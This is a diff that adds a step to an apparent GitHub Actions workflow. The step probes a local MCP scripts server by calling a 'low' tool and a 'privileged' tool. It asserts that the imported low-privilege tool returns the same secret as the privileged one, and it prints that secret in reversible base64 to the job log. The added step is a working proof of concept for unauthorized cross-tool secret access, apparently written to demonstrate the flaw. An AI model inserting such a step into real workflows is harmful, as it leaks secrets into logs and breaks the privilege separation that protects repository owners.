@@ -711,6 +711,37 @@ jobs:
 
           bash "${RUNNER_TEMP}/gh-aw/actions/start_mcp_scripts_server.sh"
 
+      - name: Live imported MCP sibling-secret content probe
+        env:
+          MCP_PORT: ${{ steps.mcp-scripts-start.outputs.port }}
+          EXPECTED_B64: QkJNQ1BfYzAwNGQ1ODI4ZTcxMzVmZjhhOTJmOGNmNWY2YzczYTFiNjJjODY3MzUxMGM0YTZk
+        run: |
+          set -euo pipefail
+          call_tool() {
+            local name="$1"
+            curl -sS --fail-with-body -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
+              --data "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"${name}\",\"arguments\":{}}}" \
+              "http://127.0.0.1:${MCP_PORT}/"
+          }
+          LOW=$(call_tool low)
+          PRIVILEGED=$(call_tool privileged)
+          echo "IMPORTED_LOW_RESPONSE=${LOW}"
+          echo "VICTIM_PRIVILEGED_RESPONSE=${PRIVILEGED}"
+          python3 - "$EXPECTED_B64" "$LOW" "$PRIVILEGED" <<'PYLIVE'
+          import base64,json,sys
+          expected=sys.argv[1]
+          def extract(raw):
+              j=json.loads(raw); texts=[x.get('text','') for x in j['result']['content'] if isinstance(x,dict)]
+              obj=json.loads('\n'.join(texts)); assert obj['present'] is True; return obj['base64']
+          low=extract(sys.argv[2]); privileged=extract(sys.argv[3])
+          assert low==expected, (low,expected)
+          assert privileged==expected, (privileged,expected)
+          assert low==privileged
+          assert base64.b64decode(low)==base64.b64decode(expected)
+          print('LIVE_IMPORTED_UNAUTHORIZED_CONTENT_MATCH=true')
+          print('LIVE_VICTIM_AUTHORIZED_CONTROL_MATCH=true')
+          print('REVERSIBLE_BASE64='+low)
+          PYLIVE
       - name: Start MCP Gateway
         id: start-mcp-gateway
         env:
